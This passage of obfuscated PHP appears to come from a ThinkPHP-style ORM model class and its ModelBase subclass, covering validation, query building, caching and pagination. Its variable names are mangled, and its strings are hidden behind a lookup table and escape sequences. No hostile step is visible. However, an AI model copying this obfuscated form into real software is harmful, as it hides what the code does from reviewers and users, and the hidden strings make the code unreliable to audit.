$¬¼£Ü‰Û) { if (empty($¬¼£Ü‰Û[2])) { $¬¼£Ü‰Û[2] = THINK_MODEL_INSERT; } if ($‹¼¨Ë·º == $¬¼£Ü‰Û[2] || $¬¼£Ü‰Û[2] == THINK_MODEL_BOTH) { switch (trim($¬¼£Ü‰Û[3])) { case $ÇáãÚ[321]: case $ÇáãÚ[322]: $‚×±Ôã½ = isset($¬¼£Ü‰Û[4]) ? (array) $¬¼£Ü‰Û[4] : array(); if (isset($µçšÂêë[$¬¼£Ü‰Û[0]])) { array_unshift($‚×±Ôã½, $µçšÂêë[$¬¼£Ü‰Û[0]]); } if ($ÇáãÚ[321] == $¬¼£Ü‰Û[3]) { $µçšÂêë[$¬¼£Ü‰Û[0]] = call_user_func_array($¬¼£Ü‰Û[1], $‚×±Ôã½); } else { $µçšÂêë[$¬¼£Ü‰Û[0]] = call_user_func_array(array(&$this, $¬¼£Ü‰Û[1]), $‚×±Ôã½); } break; case $ÇáãÚ[273]: $µçšÂêë[$¬¼£Ü‰Û[0]] = $µçšÂêë[$¬¼£Ü‰Û[1]]; break; case $ÇáãÚ[323]: if ($ÇáãÚ[12] === $µçšÂêë[$¬¼£Ü‰Û[0]]) { unset($µçšÂêë[$¬¼£Ü‰Û[0]]); } break; case $ÇáãÚ[324]: default: $µçšÂêë[$¬¼£Ü‰Û[0]] = $¬¼£Ü‰Û[1]; } if (!1 === $µçšÂêë[$¬¼£Ü‰Û[0]]) { unset($µçšÂêë[$¬¼£Ü‰Û[0]]); } } } } return $µçšÂêë; } protected function autoValidation($Ê¾’›ç«, $¸¹Õ´ï) { $ÖĞæ«î =& $_SERVER[şÒÁøÒÄ]; if (!empty($this->options[$ÖĞæ«î[325]])) { $‚ù—ÌêŸ = $this->options[$ÖĞæ«î[325]]; unset($this->options[$ÖĞæ«î[325]]); } elseif (!empty($this->_validate)) { $‚ù—ÌêŸ = $this->_validate; } if (isset($‚ù—ÌêŸ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($‚ù—ÌêŸ as $ªÎÑÎ¶² => $¶±¹Ş¹¯) { if (empty($¶±¹Ş¹¯[5]) || $¶±¹Ş¹¯[5] == THINK_MODEL_BOTH || $¶±¹Ş¹¯[5] == $¸¹Õ´ï) { if (0 == strpos($¶±¹Ş¹¯[2], $ÖĞæ«î[326]) && strpos($¶±¹Ş¹¯[2], $ÖĞæ«î[327])) { $¶±¹Ş¹¯[2] = think_lang(substr($¶±¹Ş¹¯[2], 2, -1)); } $¶±¹Ş¹¯[3] = isset($¶±¹Ş¹¯[3]) ? $¶±¹Ş¹¯[3] : THINK_EXISTS_VALIDATE; $¶±¹Ş¹¯[4] = isset($¶±¹Ş¹¯[4]) ? $¶±¹Ş¹¯[4] : $ÖĞæ«î[328]; switch ($¶±¹Ş¹¯[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ê¾’›ç«, $¶±¹Ş¹¯)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ÖĞæ«î[12] != trim($Ê¾’›ç«[$¶±¹Ş¹¯[0]])) { if (!1 === $this->_validationField($Ê¾’›ç«, $¶±¹Ş¹¯)) { return !1; } } break; default: if (isset($Ê¾’›ç«[$¶±¹Ş¹¯[0]])) { if (!1 === $this->_validationField($Ê¾’›ç«, $¶±¹Ş¹¯)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ê¾•†ˆŸ, $Ü˜‘Š¸€) { if (!1 === $this->_validationFieldItem($ê¾•†ˆŸ, $Ü˜‘Š¸€)) { if ($this->patchValidate) { $this->error[$Ü˜‘Š¸€[0]] = $Ü˜‘Š¸€[2]; } else { $this->error = $Ü˜‘Š¸€[2]; return !1; } } return; } protected function _validationFieldItem($ƒÏ¸¶é¯, $›ÊôŞĞ) { $ÌŒ›Ì¹ =& $_SERVER[şÒÁøÒÄ]; switch (strtolower(trim($›ÊôŞĞ[4]))) { case $ÌŒ›Ì¹[321]: case $ÌŒ›Ì¹[322]: $†ÜšÎ¨ = isset($›ÊôŞĞ[6]) ? (array) $›ÊôŞĞ[6] : array(); if (is_string($›ÊôŞĞ[0]) && strpos($›ÊôŞĞ[0], $ÌŒ›Ì¹[50])) { $›ÊôŞĞ[0] = explode($ÌŒ›Ì¹[50], $›ÊôŞĞ[0]); } if (is_array($›ÊôŞĞ[0])) { foreach ($›ÊôŞĞ[0] as $…Ö²à±æ) { $Œ¦ïâ¦›[$…Ö²à±æ] = $ƒÏ¸¶é¯[$…Ö²à±æ]; } array_unshift($†ÜšÎ¨, $Œ¦ïâ¦›); } else { array_unshift($†ÜšÎ¨, $ƒÏ¸¶é¯[$›ÊôŞĞ[0]]); } if ($ÌŒ›Ì¹[321] == $›ÊôŞĞ[4]) { return call_user_func_array($›ÊôŞĞ[1], $†ÜšÎ¨); } else { return call_user_func_array(array(&$this, $›ÊôŞĞ[1]), $†ÜšÎ¨); } case $ÌŒ›Ì¹[329]: return $ƒÏ¸¶é¯[$›ÊôŞĞ[0]] == $ƒÏ¸¶é¯[$›ÊôŞĞ[1]]; case $ÌŒ›Ì¹[330]: if (is_string($›ÊôŞĞ[0]) && strpos($›ÊôŞĞ[0], $ÌŒ›Ì¹[50])) { $›ÊôŞĞ[0] = explode($ÌŒ›Ì¹[50], $›ÊôŞĞ[0]); } $¹¨ù = array(); if (is_array($›ÊôŞĞ[0])) { foreach ($›ÊôŞĞ[0] as $…Ö²à±æ) { $¹¨ù[$…Ö²à±æ] = $ƒÏ¸¶é¯[$…Ö²à±æ]; } } else { $¹¨ù[$›ÊôŞĞ[0]] = $ƒÏ¸¶é¯[$›ÊôŞĞ[0]]; } if (!empty($ƒÏ¸¶é¯[$this->getPk()])) { $¹¨ù[$this->getPk()] = array($ÌŒ›Ì¹[331], $ƒÏ¸¶é¯[$this->getPk()]); } if ($this->where($¹¨ù)->find()) { return !1; } return !0; default: return $this->check($ƒÏ¸¶é¯[$›ÊôŞĞ[0]], $›ÊôŞĞ[1], $›ÊôŞĞ[4]); } } public function check($ÂíõÓ¦, $«¬ãàœ³, $àÚûà÷ı = "\x72\x65\147\145\x78") { $ÑÌÚ¹Œ÷ =& $_SERVER[şÒÁøÒÄ]; $àÚûà÷ı = strtolower(trim($àÚûà÷ı)); switch ($àÚûà÷ı) { case $ÑÌÚ¹Œ÷[7]: case $ÑÌÚ¹Œ÷[332]: $ûÑë×Ø = is_array($«¬ãàœ³) ? $«¬ãàœ³ : explode($ÑÌÚ¹Œ÷[50], $«¬ãàœ³); return $àÚûà÷ı == $ÑÌÚ¹Œ÷[7] ? in_array($ÂíõÓ¦, $ûÑë×Ø) : !in_array($ÂíõÓ¦, $ûÑë×Ø); case $ÑÌÚ¹Œ÷[333]: case $ÑÌÚ¹Œ÷[334]: if (is_array($«¬ãàœ³)) { $Ø¡¦î‹á = $«¬ãàœ³[0]; $ü¹ÛœÊ = $«¬ãàœ³[1]; } else { list($Ø¡¦î‹á, $ü¹ÛœÊ) = explode($ÑÌÚ¹Œ÷[50], $«¬ãàœ³); } return $àÚûà÷ı == $ÑÌÚ¹Œ÷[333] ? $ÂíõÓ¦ >= $Ø¡¦î‹á && $ÂíõÓ¦ <= $ü¹ÛœÊ : $ÂíõÓ¦ < $Ø¡¦î‹á || $ÂíõÓ¦ > $ü¹ÛœÊ; case $ÑÌÚ¹Œ÷[335]: case $ÑÌÚ¹Œ÷[336]: return $àÚûà÷ı == $ÑÌÚ¹Œ÷[335] ? $ÂíõÓ¦ == $«¬ãàœ³ : $ÂíõÓ¦ != $«¬ãàœ³; case $ÑÌÚ¹Œ÷[337]: $…†É‚Ö = mb_strlen($ÂíõÓ¦, $ÑÌÚ¹Œ÷[338]); if (strpos($«¬ãàœ³, $ÑÌÚ¹Œ÷[50])) { list($Ø¡¦î‹á, $ü¹ÛœÊ) = explode($ÑÌÚ¹Œ÷[50], $«¬ãàœ³); return $…†É‚Ö >= $Ø¡¦î‹á && $…†É‚Ö <= $ü¹ÛœÊ; } else { return $…†É‚Ö == $«¬ãàœ³; } case $ÑÌÚ¹Œ÷[339]: list($¨†±ô¬è, $î¤áÛØ–) = explode($ÑÌÚ¹Œ÷[50], $«¬ãàœ³); if (!is_numeric($¨†±ô¬è)) { $¨†±ô¬è = strtotime($¨†±ô¬è); } if (!is_numeric($î¤áÛØ–)) { $î¤áÛØ– = strtotime($î¤áÛØ–); } return NOW_TIME >= $¨†±ô¬è && NOW_TIME <= $î¤áÛØ–; case $ÑÌÚ¹Œ÷[340]: return in_array(get_client_ip(), explode($ÑÌÚ¹Œ÷[50], $«¬ãàœ³)); case $ÑÌÚ¹Œ÷[341]: return !in_array(get_client_ip(), explode($ÑÌÚ¹Œ÷[50], $«¬ãàœ³)); case $ÑÌÚ¹Œ÷[328]: default: return $this->regex($ÂíõÓ¦, $«¬ãàœ³); } } public function query($è¤°Ë­ı, $éæ»±ËŸ = false) { $ìâïıŞü =& $_SERVER[şÒÁøÒÄ]; if (!is_bool($éæ»±ËŸ) && !is_array($éæ»±ËŸ)) { $éæ»±ËŸ = func_get_args(); array_shift($éæ»±ËŸ); } $è¤°Ë­ı = str_replace(array($ìâïıŞü[231], $ìâïıŞü[342]), $ìâïıŞü[53], $è¤°Ë­ı); $è¤°Ë­ı = $this->parseSql($è¤°Ë­ı, $éæ»±ËŸ); return $this->db->query($è¤°Ë­ı); } public function execute($­­Ó…, $¥ş¯£ÜÒ = false) { if (!is_bool($¥ş¯£ÜÒ) && !is_array($¥ş¯£ÜÒ)) { $¥ş¯£ÜÒ = func_get_args(); array_shift($¥ş¯£ÜÒ); } $­­Ó… = $this->parseSql($­­Ó…, $¥ş¯£ÜÒ); return $this->db->execute($­­Ó…); } protected function parseSql($¯„¿ß¾, $Ó›¦Æå±) { $ÉÊ‰ËŠÉ =& $_SERVER[şÒÁøÒÄ]; if (!0 === $Ó›¦Æå±) { $˜î²µ‰ = $this->_parseOptions(); $¯„¿ß¾ = $this->db->parseSql($¯„¿ß¾, $˜î²µ‰); } elseif (is_array($Ó›¦Æå±)) { $Ó›¦Æå± = array_map(array($this->db, $ÉÊ‰ËŠÉ[343]), $Ó›¦Æå±); $¯„¿ß¾ = vsprintf($¯„¿ß¾, $Ó›¦Æå±); } else { $¯„¿ß¾ = strtr($¯„¿ß¾, array($ÉÊ‰ËŠÉ[344] => $this->getTableName(), $ÉÊ‰ËŠÉ[345] => think_config($ÉÊ‰ËŠÉ[244]))); } $this->db->setModel($this->name); return $¯„¿ß¾; } public function db($ƒÙİÁô½ = '', $ğã›·¼ñ = '', $ÖÁ˜ĞüÀ = array()) { $ÊÎÊ¢¡˜ =& $_SERVER[şÒÁøÒÄ]; if ($ÊÎÊ¢¡˜[12] === $ƒÙİÁô½ && $this->db) { return $this->db; } static $²êÚæ¯ = array(); static $á¶—¤İÃ = array(); if (!isset($á¶—¤İÃ[$ƒÙİÁô½]) || isset($á¶—¤İÃ[$ƒÙİÁô½]) && $ğã›·¼ñ && $²êÚæ¯[$ƒÙİÁô½] != $ğã›·¼ñ) { if (!empty($ğã›·¼ñ) && is_string($ğã›·¼ñ) && !1 === strpos($ğã›·¼ñ, $ÊÎÊ¢¡˜[8])) { $ğã›·¼ñ = think_config($ğã›·¼ñ); } $ƒÙİÁô½ = think_guid($ğã›·¼ñ); $á¶—¤İÃ[$ƒÙİÁô½] = Db::getInstance($ğã›·¼ñ); } elseif (NULL === $ğã›·¼ñ) { $á¶—¤İÃ[$ƒÙİÁô½]->close(); unset($á¶—¤İÃ[$ƒÙİÁô½]); return; } if (!empty($ÖÁ˜ĞüÀ)) { if (is_string($ÖÁ˜ĞüÀ)) { parse_str($ÖÁ˜ĞüÀ, $ÖÁ˜ĞüÀ); } foreach ($ÖÁ˜ĞüÀ as $ˆ¹õµõÙ => $½ø¢¤šÉ) { $this->setProperty($ˆ¹õµõÙ, $½ø¢¤šÉ); } } $²êÚæ¯[$ƒÙİÁô½] = $ğã›·¼ñ; $this->db = $á¶—¤İÃ[$ƒÙİÁô½]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÓŒŒ“¸ = get_class($this); if ($ÓŒŒ“¸ == $_SERVER[şÒÁøÒÄ][346]) { return $this->name; } $this->name = substr($ÓŒŒ“¸, 0, -5); } return $this->name; } public function getTableName() { $»À¼û•À =& $_SERVER[şÒÁøÒÄ]; if (empty($this->trueTableName)) { $Å®¥É = !empty($this->tablePrefix) ? $this->tablePrefix : $»À¼û•À[12]; if (!empty($this->tableName)) { $Å®¥É .= $this->tableName; } else { $Å®¥É .= think_parse_name($this->name); } $this->trueTableName = strtolower($Å®¥É); } return (!empty($this->dbName) ? $this->dbName . $»À¼û•À[10] : $»À¼û•À[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ŞŒŒ‡­– =& $_SERVER[şÒÁøÒÄ]; return isset($this->fields[$ŞŒŒ‡­–[251]]) ? $this->fields[$ŞŒŒ‡­–[251]] : $this->pk; } public function getDbFields() { $«Ó•ı»° =& $_SERVER[şÒÁøÒÄ]; if (isset($this->options[$«Ó•ı»°[279]])) { $ª™á¿üè = $this->db->getFields($this->options[$«Ó•ı»°[279]]); return $ª™á¿üè ? array_keys($ª™á¿üè) : !1; } if ($this->fields) { $ª™á¿üè = $this->fields; unset($ª™á¿üè[$«Ó•ı»°[250]], $ª™á¿üè[$«Ó•ı»°[251]], $ª™á¿üè[$«Ó•ı»°[252]], $ª™á¿üè[$«Ó•ı»°[249]]); return $ª™á¿üè; } return !1; } public function data($¸ÂšÏÚ— = '') { $¢©ğ£˜• =& $_SERVER[şÒÁøÒÄ]; if ($¢©ğ£˜•[12] === $¸ÂšÏÚ— && !empty($this->data)) { return $this->data; } if (is_object($¸ÂšÏÚ—)) { $¸ÂšÏÚ— = get_object_vars($¸ÂšÏÚ—); } elseif (is_string($¸ÂšÏÚ—)) { parse_str($¸ÂšÏÚ—, $¸ÂšÏÚ—); } elseif (!is_array($¸ÂšÏÚ—)) { think_exception(think_lang($¢©ğ£˜•[271])); } $this->data = $¸ÂšÏÚ—; return $this; } public function join($Šß„Óà) { $¢±ó‡÷Š =& $_SERVER[şÒÁøÒÄ]; if (is_array($Šß„Óà)) { $this->options[$¢±ó‡÷Š[282]] = $Šß„Óà; } elseif (!empty($Šß„Óà)) { $this->options[$¢±ó‡÷Š[282]][] = $Šß„Óà; } return $this; } public function union($´±–‰Ôö, $™Œ­³œæ = false) { $®½šşö• =& $_SERVER[şÒÁøÒÄ]; if (empty($´±–‰Ôö)) { return $this; } if ($™Œ­³œæ) { $this->options[$®½šşö•[347]][$®½šşö•[348]] = !0; } if (is_object($´±–‰Ôö)) { $´±–‰Ôö = get_object_vars($´±–‰Ôö); } if (is_string($´±–‰Ôö)) { $¥Öâüøˆ = $´±–‰Ôö; } elseif (is_array($´±–‰Ôö)) { if (isset($´±–‰Ôö[0])) { $this->options[$®½šşö•[347]] = array_merge($this->options[$®½šşö•[347]], $´±–‰Ôö); return $this; } else { $¥Öâüøˆ = $´±–‰Ôö; } } else { think_exception(think_lang($®½šşö•[271])); } $this->options[$®½šşö•[347]][] = $¥Öâüøˆ; return $this; } public function cache($ŸŠù¦İ = true, $‰¦¡üÁö = null, $¶ ³’Ÿ¥ = '') { $£¢ÁÖ¶‚ =& $_SERVER[şÒÁøÒÄ]; if (!1 !== $ŸŠù¦İ) { $this->options[$£¢ÁÖ¶‚[349]] = array($£¢ÁÖ¶‚[94] => $ŸŠù¦İ, $£¢ÁÖ¶‚[339] => $‰¦¡üÁö, $£¢ÁÖ¶‚[33] => $¶ ³’Ÿ¥); } return $this; } public function field($¹©¾Öê, $•’„İ£ = false) { $¨¼Î¹îí =& $_SERVER[şÒÁøÒÄ]; if (!0 === $¹©¾Öê) { $ŠÒ©Ñö = $this->getDbFields(); $¹©¾Öê = $ŠÒ©Ñö ? $ŠÒ©Ñö : $¨¼Î¹îí[189]; } elseif ($•’„İ£) { if (is_string($¹©¾Öê)) { $¹©¾Öê = explode($¨¼Î¹îí[50], $¹©¾Öê); } $ŠÒ©Ñö = $this->getDbFields(); $¹©¾Öê = $ŠÒ©Ñö ? array_diff($ŠÒ©Ñö, $¹©¾Öê) : $¹©¾Öê; } $this->options[$¨¼Î¹îí[273]] = $¹©¾Öê; return $this; } public function scope($îÅİ‹Ñ = '', $¦³ºÄ’  = NULL) { $ı·ˆš† =& $_SERVER[şÒÁøÒÄ]; if ($ı·ˆš†[12] === $îÅİ‹Ñ) { if (isset($this->_scope[$ı·ˆš†[37]])) { $îĞ€’•Ï = $this->_scope[$ı·ˆš†[37]]; } else { return $this; } } elseif (is_string($îÅİ‹Ñ)) { $µ§®ãÛ = explode($ı·ˆš†[50], $îÅİ‹Ñ); $îĞ€’•Ï = array(); foreach ($µ§®ãÛ as $ñêĞÇˆÙ) { if (!isset($this->_scope[$ñêĞÇˆÙ])) { continue; } $îĞ€’•Ï = array_merge($îĞ€’•Ï, $this->_scope[$ñêĞÇˆÙ]); } if (!empty($¦³ºÄ’ ) && is_array($¦³ºÄ’ )) { $îĞ€’•Ï = array_merge($îĞ€’•Ï, $¦³ºÄ’ ); } } elseif (is_array($îÅİ‹Ñ)) { $îĞ€’•Ï = $îÅİ‹Ñ; } if (is_array($îĞ€’•Ï) && !empty($îĞ€’•Ï)) { $this->options = array_merge($this->options, array_change_key_case($îĞ€’•Ï)); } return $this; } public function where($Ş…õŸ†Ñ, $Ğ¹ììÄ— = null) { $Ó•È”¯ =& $_SERVER[şÒÁøÒÄ]; if (!is_null($Ğ¹ììÄ—) && is_string($Ş…õŸ†Ñ)) { if (!is_array($Ğ¹ììÄ—)) { $Ğ¹ììÄ— = func_get_args(); array_shift($Ğ¹ììÄ—); } $Ğ¹ììÄ— = array_map(array($this->db, $Ó•È”¯[343]), $Ğ¹ììÄ—); $Ş…õŸ†Ñ = vsprintf($Ş…õŸ†Ñ, $Ğ¹ììÄ—); } elseif (is_object($Ş…õŸ†Ñ)) { $Ş…õŸ†Ñ = get_object_vars($Ş…õŸ†Ñ); } elseif (is_array($Ş…õŸ†Ñ)) { foreach ($Ş…õŸ†Ñ as $Ä£ãïÆ€ => $çÔù±¥Ñ) { if ((is_numeric($Ä£ãïÆ€) || !$Ä£ãïÆ€) && is_string($çÔù±¥Ñ)) { if (strpos($çÔù±¥Ñ, $Ó•È”¯[350]) === 0) { continue; } think_trace($Ó•È”¯[351], $Ó•È”¯[12], $Ó•È”¯[49]); die; } } } if (is_string($Ş…õŸ†Ñ) && $Ó•È”¯[12] != $Ş…õŸ†Ñ) { $’Û¯İÆ = array(); $’Û¯İÆ[$Ó•È”¯[352]] = $Ş…õŸ†Ñ; $Ş…õŸ†Ñ = $’Û¯İÆ; } if (isset($this->options[$Ó•È”¯[275]])) { $this->options[$Ó•È”¯[275]] = array_merge($this->options[$Ó•È”¯[275]], $Ş…õŸ†Ñ); } else { $this->options[$Ó•È”¯[275]] = $Ş…õŸ†Ñ; } return $this; } public function limit($¢Õ±ü®í, $¹¾üÌ¦õ = null) { $è»Ù™Ç¬ =& $_SERVER[şÒÁøÒÄ]; $this->options[$è»Ù™Ç¬[292]] = is_null($¹¾üÌ¦õ) ? $¢Õ±ü®í : $¢Õ±ü®í . $è»Ù™Ç¬[50] . $¹¾üÌ¦õ; return $this; } public function page($€äƒç‰, $ÅäâÙÛ° = null) { $­Ù¼±ü  =& $_SERVER[şÒÁøÒÄ]; $this->options[$­Ù¼±ü [353]] = is_null($ÅäâÙÛ°) ? $€äƒç‰ : $€äƒç‰ . $­Ù¼±ü [50] . $ÅäâÙÛ°; return $this; } public function comment($ã¤¢ÎÏ) { $this->options[$_SERVER[şÒÁøÒÄ][354]] = $ã¤¢ÎÏ; return $this; } public function setProperty($µùÜ‹áÌ, $œùŞØÏ) { if (property_exists($this, $µùÜ‹áÌ)) { $this->{$µùÜ‹áÌ} = $œùŞØÏ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\x66\x79\x54\x69\155\145", "\x74\x69\155\145", "\x69\156\x73\x65\x72\x74\x2c\165\160\x64\x61\x74\145", "\146\165\156\143\164\x69\x6f\156"), array("\143\x72\145\141\x74\x65\124\151\x6d\x65", "\x74\151\155\x65", "\151\156\163\145\162\x74", "\146\x75\x6e\143\164\x69\157\x6e")); public function setDataAuto($œÕ’¤Ë²) { $this->dataAuto = $œÕ’¤Ë²; } public function __construct($‹÷áì¼¸ = '', $â¶ˆ¿œ = '', $ƒ¾ÁÍóÜ = '') { parent::__construct($‹÷áì¼¸, $â¶ˆ¿œ, $ƒ¾ÁÍóÜ); } protected $tableMeta = array(); protected function _beforeInsert(&$¯É„º—, $»Ê‡®ŸÂ) { $éÄ¡ê½¿ =& $_SERVER[şÒÁøÒÄ]; if (!$this->checkDataAutoHas($éÄ¡ê½¿[355])) { return; } $this->dataBeforeFilter($¯É„º—, $éÄ¡ê½¿[355]); } protected function _beforeUpdate(&$æ¿¯©ä›, $ ÏèÒ¾) { $ì²º…¦ =& $_SERVER[şÒÁøÒÄ]; if (!$this->checkDataAutoHas($ì²º…¦[356])) { return; } $this->dataBeforeFilter($æ¿¯©ä›, $ì²º…¦[356]); } protected function _afterSelect(&$°™Ü›°İ, $ˆÕßÙªî) { if (!is_array($°™Ü›°İ)) { return; } if (!$this->checkDataAutoHas($_SERVER[şÒÁøÒÄ][357])) { return; } foreach ($°™Ü›°İ as &$Åµø»„) { $this->dataAfterFilter($Åµø»„); } unset($Åµø»„); } protected function _afterFind(&$ û££†, $«ş‡ÚŠÜ) { if (!is_array($ û££†)) { return; } if (!$this->checkDataAutoHas($_SERVER[şÒÁøÒÄ][357])) { return; } $this->dataAfterFilter($ û££†); } public static function textEncode($Ù‡ıöØ) { if (!$Ù‡ıöØ) { return $Ù‡ıöØ; } $üŞ…€ñ = json_encode($Ù‡ıöØ); $üŞ…€ñ = preg_replace_callback($_SERVER[şÒÁøÒÄ][358], function ($¼–ôô·Ÿ) { return addslashes($¼–ôô·Ÿ[0]); }, $üŞ…€ñ); return json_decode($üŞ…€ñ); } public static function textDecode($›•Œ¶é¥) { $¹¯Ñ³œ¦ =& $_SERVER[şÒÁøÒÄ]; $”¾™ÁÕÎ = json_encode($›•Œ¶é¥); $”¾™ÁÕÎ = preg_replace_callback($¹¯Ñ³œ¦[359], function ($Ñ„Üá›Â) { return $_SERVER[şÒÁøÒÄ][97]; }, $”¾™ÁÕÎ); return json_decode($”¾™ÁÕÎ); } public function setAutoIncrement($°–Ğ° â) { $ÆÊ©â² = array($this->getPk() => $°–Ğ° â); $ó±æ—ºŞ = $this->data($ÆÊ©â²)->add(); if ($ó±æ—ºŞ) { $this->delete($ó±æ—ºŞ); } } public function getAutoIncrement() { $ÛïÇã¥¯ = $this->getTableName(); $ÉñÎğÍÁ = $this->max($this->getPk()); $ĞÈ®”  = $this->query("\163\150\x6f\167\x20\164\x61\x62\x6c\x65\40\163\x74\141\x74\x75\x73\x20\x77\150\145\x72\145\40\116\141\x6d\x65\x3d\x27{$ÛïÇã¥¯}\47"); $¥åÍÑ‰é = $ĞÈ®” [0][$_SERVER[şÒÁøÒÄ][360]]; $é¹˜«é½ = max($ÉñÎğÍÁ, $¥åÍÑ‰é); return $é¹˜«é½; } protected function _callBefore($åö¤ùç, $Ş¸âŸ®œ) { return $this->cacheCallCheck($åö¤ùç, $Ş¸âŸ®œ, !1); } protected function _callAfter($Şµ´ıÍ„, $ëÔô±¥¯) { return $this->cacheCallCheck($Şµ´ıÍ„, $ëÔô±¥¯, !0); } protected function cacheFunctionAlias($Ø‚àßß) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Ò¥ÇªÛ¢, $Ñ¹¯çˆÉ, $€ÕÛ²à = false) { $ô–ÂÄÄ¼ = $this->cacheFunctionAlias($Ñ¹¯çˆÉ); if (!$ô–ÂÄÄ¼) { return; } foreach ($ô–ÂÄÄ¼ as $÷‘Ì‹°ª => $á¬™õ×€) { $÷­ãÍ•¼ = $á¬™õ×€[0]; $Â‰ó‰À = explode($_SERVER[şÒÁøÒÄ][50], $á¬™õ×€[1]); if ($Ò¥ÇªÛ¢ == $÷‘Ì‹°ª) { return $this->cacheFunctionGet($÷‘Ì‹°ª, $÷­ãÍ•¼); } if ($€ÕÛ²à && in_array($Ò¥ÇªÛ¢, $Â‰ó‰À)) { $this->cacheFunctionClear($÷‘Ì‹°ª, $÷­ãÍ•¼); } } } public function cacheFunctionGet($¡ëë—üÃ, $éÆŒì¬ı) { $ÔúöÓ¿ç = $this->cacheKeyMake($¡ëë—üÃ, $éÆŒì¬ı); $Ğ¤ŸÛ = Cache::get($ÔúöÓ¿ç); if (!is_array($Ğ¤ŸÛ)) { $Ğ¤ŸÛ = call_user_func_array(array($this, $¡ëë—üÃ), array($éÆŒì¬ı, !0)); Cache::set($ÔúöÓ¿ç, $Ğ¤ŸÛ); } return $Ğ¤ŸÛ; } public function cacheFunctionClear($„–òÍ³, $«ø¦í²) { $ç™Òéóö = $«ø¦í²; if (!is_array($«ø¦í²)) { $ç™Òéóö = array($«ø¦í²); } foreach ($ç™Òéóö as $Ö—äÜ¢) { $¸™íªöü = $this->cacheKeyMake($„–òÍ³, $Ö—äÜ¢); Cache::remove($¸™íªöü); } } private function cacheKeyMake($ìÆŒ–ˆã, $¥æÂõôù) { $”âÔÅÎ =& $_SERVER[şÒÁøÒÄ]; return get_class($this) . $”âÔÅÎ[11] . $ìÆŒ–ˆã . $”âÔÅÎ[361] . $¥æÂõôù; } protected function selectPageReset() { $œ–òÄÚÌ =& $_SERVER[şÒÁøÒÄ]; if (isset($GLOBALS[$œ–òÄÚÌ[362]])) { return; } $GLOBALS[$œ–òÄÚÌ[362]] = isset($GLOBALS[$œ–òÄÚÌ[7]][$œ–òÄÚÌ[363]]) ? $GLOBALS[$œ–òÄÚÌ[7]][$œ–òÄÚÌ[363]] : !1; $GLOBALS[$œ–òÄÚÌ[364]] = isset($GLOBALS[$œ–òÄÚÌ[7]][$œ–òÄÚÌ[353]]) ? $GLOBALS[$œ–òÄÚÌ[7]][$œ–òÄÚÌ[353]] : !1; $GLOBALS[$œ–òÄÚÌ[7]][$œ–òÄÚÌ[363]] = !1; $GLOBALS[$œ–òÄÚÌ[7]][$œ–òÄÚÌ[353]] = !1; } protected function selectPageRestore() { $»°÷Ñ»¯ =& $_SERVER[şÒÁøÒÄ]; if (!isset($GLOBALS[$»°÷Ñ»¯[362]])) { return; } $GLOBALS[$»°÷Ñ»¯[7]][$»°÷Ñ»¯[363]] = $GLOBALS[$»°÷Ñ»¯[362]]; $GLOBALS[$»°÷Ñ»¯[7]][$»°÷Ñ»¯[353]] = $GLOBALS[$»°÷Ñ»¯[364]]; if ($GLOBALS[$»°÷Ñ»¯[7]][$»°÷Ñ»¯[363]] === !1) { unset($GLOBALS[$»°÷Ñ»¯[7]][$»°÷Ñ»¯[363]]); } if ($GLOBALS[$»°÷Ñ»¯[7]][$»°÷Ñ»¯[353]] === !1) { unset($GLOBALS[$»°÷Ñ»¯[7]][$»°÷Ñ»¯[353]]); } unset($GLOBALS[$»°÷Ñ»¯[362]]); unset($GLOBALS[$»°÷Ñ»¯[364]]); } protected function selectPage($ó‡¶»À† = 200, $Øç¿Û­Í = 1) { $¬ùà ¬º =& $_SERVER[şÒÁøÒÄ]; global $in; $¶Óı«¦• = $this->optionsValue(); $Äüğ¡Æ÷ = 50000; $ó‡¶»À† = isset($in[$¬ùà ¬º[363]]) && $in[$¬ùà ¬º[363]] ? $in[$¬ùà ¬º[363]] : $ó‡¶»À†; if ($ó‡¶»À† === -1) { $in[$¬ùà ¬º[363]] = !1; $Äüğ¡Æ÷ = 100000000; $ó‡¶»À† = $Äüğ¡Æ÷; } $¿øş®Í  = $¶Óı«¦•; $¿øş®Í [$¬ùà ¬º[365]] = array(); $ó‡¶»À† = intval($ó‡¶»À†); $ó‡¶»À† = $ó‡¶»À† <= 5 ? 5 : ($ó‡¶»À† >= $Äüğ¡Æ÷ ? $Äüğ¡Æ÷ : $ó‡¶»À†); $Øç¿Û­Í = intval(isset($in[$¬ùà ¬º[353]]) && $in[$¬ùà ¬º[353]] ? $in[$¬ùà ¬º[353]] : $Øç¿Û­Í); $Øç¿Û­Í = $Øç¿Û­Í <= 1 ? 1 : $Øç¿Û­Í; $ÑØ­½ = array(); $•¿Ã²Òƒ = 1; if ($Øç¿Û­Í == 1 && $•¿Ã²Òƒ) { $this->optionsValue($¶Óı«¦•); $ÑØ­½ = $this->page($Øç¿Û­Í, $ó‡¶»À†)->select(); $ÁÂª´û¬ = is_array($ÑØ­½) ? count($ÑØ­½) : 0; if ($ÁÂª´û¬ < $ó‡¶»À†) { $Îñåòü¡ = 1; } else { $this->optionsValue($¿øş®Í ); $ÁÂª´û¬ = intval($this->count()); $Îñåòü¡ = ceil($ÁÂª´û¬ / $ó‡¶»À†); } } else { $this->optionsValue($¿øş®Í ); $ÁÂª´û¬ = intval($this->count()); $Îñåòü¡ = ceil($ÁÂª´û¬ / $ó‡¶»À†); $Øç¿Û­Í = $Øç¿Û­Í >= $Îñåòü¡ ? $Îñåòü¡ : $Øç¿Û­Í; $this->optionsValue($¶Óı«¦•); $ÑØ­½ = $this->page($Øç¿Û­Í, 